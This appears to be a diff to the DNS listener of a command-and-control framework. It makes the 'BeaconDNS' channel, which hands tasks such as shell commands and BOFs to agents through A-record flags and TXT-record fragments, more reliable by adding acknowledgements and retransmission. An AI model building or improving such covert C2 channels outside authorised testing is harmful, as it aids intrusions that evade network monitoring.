@@ -418,6 +418,18 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 			// 如果是 A 记录心跳请求：不返回数据，只返回 flag IP (0.0.0.1 有任务, 0.0.0.0 无任务)
 			if reqQType == dns.TypeA {
+				// 收到 A 记录心跳，说明 Agent 处于空闲或心跳状态。
+				// 这意味着之前的 TXT 下载任务（如果有）已经成功完成。
+				// 我们可以安全地清理掉已完成的下行任务缓存。
+				d.mu.Lock()
+				if oldDf, ok := d.downFrags[sid]; ok && oldDf.off >= oldDf.total {
+					delete(d.downFrags, sid)
+					if dnsDebug {
+						fmt.Printf("[BeaconDNS] [ACK] Task confirmed by A-Record | sid=%s\n", sid)
+					}
+				}
+				d.mu.Unlock()
+
 				hasTasks := (df != nil && df.off < df.total)
 				if hasTasks {
 					// 有任务 -> 返回 0.0.0.1，通知 Agent 切换 TXT 拉取
@@ -431,35 +443,44 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				// 不生成 frame，也不增加 df.off
 			} else {
 				// 如果是 TXT (或其他) 请求：返回实际数据分片
-				if df != nil && df.off < df.total {
-					// 为了兼容 TXT RDATA 255 字节长度限制以及避免 UDP 碎片化
-					// 247 字节过于激进，导致大包（如 BOF 下发）极易丢包。
-					// 改为 180 字节，留足安全余量。
-					maxChunk := d.Config.PktSize
-					if maxChunk <= 0 || maxChunk > 180 {
-						maxChunk = 180
-					}
-					remaining := df.total - df.off
-					chunkLen := remaining
-					if chunkLen > uint32(maxChunk) {
-						chunkLen = uint32(maxChunk)
-					}
-
-					frame = make([]byte, 8+chunkLen)
-					binary.BigEndian.PutUint32(frame[0:4], df.total)
-					binary.BigEndian.PutUint32(frame[4:8], df.off)
-					copy(frame[8:], df.buf[df.off:df.off+chunkLen])
-
-					if dnsDebug {
-						fmt.Printf("[BeaconDNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d)\n",
-							sid, chunkLen, df.off, df.total)
-					}
-
-					df.off += chunkLen
+				if df != nil {
+					// 重传逻辑：如果 df.off >= df.total，说明 Server 认为发完了，但 Agent 还在发 TXT GET。
+					// 这意味着 Agent 没收到（丢包了）。
+					// 对于单包任务（绝大多数 shell 命令），直接重发。
+					// 对于多包任务，简单粗暴地从头重发（虽然低效，但比死锁好）。
 					if df.off >= df.total {
-						d.mu.Lock()
-						delete(d.downFrags, sid)
-						d.mu.Unlock()
+						if dnsDebug {
+							fmt.Printf("[BeaconDNS] [RETRY] Agent requested data again | sid=%s | Resending from offset 0\n", sid)
+						}
+						df.off = 0
+					}
+
+					if df.off < df.total {
+						// 为了兼容 TXT RDATA 255 字节长度限制以及避免 UDP 碎片化
+						// 247 字节过于激进，导致大包（如 BOF 下发）极易丢包。
+						// 改为 180 字节，留足安全余量。
+						maxChunk := d.Config.PktSize
+						if maxChunk <= 0 || maxChunk > 180 {
+							maxChunk = 180
+						}
+						remaining := df.total - df.off
+						chunkLen := remaining
+						if chunkLen > uint32(maxChunk) {
+							chunkLen = uint32(maxChunk)
+						}
+
+						frame = make([]byte, 8+chunkLen)
+						binary.BigEndian.PutUint32(frame[0:4], df.total)
+						binary.BigEndian.PutUint32(frame[4:8], df.off)
+						copy(frame[8:], df.buf[df.off:df.off+chunkLen])
+
+						if dnsDebug {
+							fmt.Printf("[BeaconDNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d)\n",
+								sid, chunkLen, df.off, df.total)
+						}
+
+						df.off += chunkLen
+						// 不要在这里立即删除！等待 A 记录确认。
 					}
 				}
 
